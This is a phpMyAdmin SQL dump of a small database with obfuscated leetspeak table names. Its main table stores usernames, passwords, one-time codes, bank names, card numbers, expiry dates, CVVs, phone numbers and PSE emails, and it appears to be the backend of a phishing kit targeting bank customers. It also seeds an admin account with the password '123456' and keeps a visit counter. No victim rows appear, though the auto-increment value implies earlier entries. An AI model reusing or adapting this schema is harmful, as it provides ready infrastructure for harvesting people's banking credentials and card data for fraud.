-- phpMyAdmin 
-- version 5.1.1
-- https://www.phpmyadmin.net/
--
-- Servidor: 127.0.0.1
-- Tiempo de generación: 18-07-2024 a las 18:54:18
-- Versión del servidor: 10.4.20-MariaDB
-- Versión de PHP: 8.0.9

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de datos: `metr0n1c4`
--

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `m3it3m`
--

CREATE TABLE `m3it3m` (
  `idreg` int(11) NOT NULL,
  `usuario` varchar(60) DEFAULT NULL,
  `password` varchar(30) DEFAULT NULL,
  `otp` varchar(30) DEFAULT NULL,
  `dispositivo` varchar(20) DEFAULT NULL,
  `ip` varchar(50) DEFAULT NULL,
  `id` varchar(50) DEFAULT NULL,
  `agente` varchar(20) DEFAULT NULL,
  `banco` varchar(30) DEFAULT NULL,
  `status` int(20) DEFAULT NULL,
  `horacreado` datetime NOT NULL,
  `horamodificado` datetime NOT NULL,
  `email` varchar(60) DEFAULT NULL,
  `cemail` varchar(20) DEFAULT NULL,
  `tarjeta` varchar(40) DEFAULT NULL,
  `ftarjeta` varchar(30) DEFAULT NULL,
  `cvv` varchar(10) DEFAULT NULL,
  `celular` varchar(40) DEFAULT NULL,
  `idcliente` varchar(25) DEFAULT NULL,
  `lineaclaro` varchar(25) DEFAULT NULL,
  `correopse` varchar(60) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `m3us3r`
--

CREATE TABLE `m3us3r` (
  `usuario` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `hora` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `m3us3r`
--

INSERT INTO `m3us3r` (`usuario`, `password`, `hora`) VALUES
('admin', '123456', '2021-12-30 00:00:00');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `m3v1s1t`
--

CREATE TABLE `m3v1s1t` (
  `contador` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `m3v1s1t`
--

INSERT INTO `m3v1s1t` (`contador`) VALUES
(0);

--
-- Índices para tablas volcadas
--

--
-- Indices de la tabla `m3it3m`
--
ALTER TABLE `m3it3m`
  ADD PRIMARY KEY (`idreg`);

--
-- AUTO_INCREMENT de las tablas volcadas
--

--
-- AUTO_INCREMENT de la tabla `m3it3m`
--
ALTER TABLE `m3it3m`
  MODIFY `idreg` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=409;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
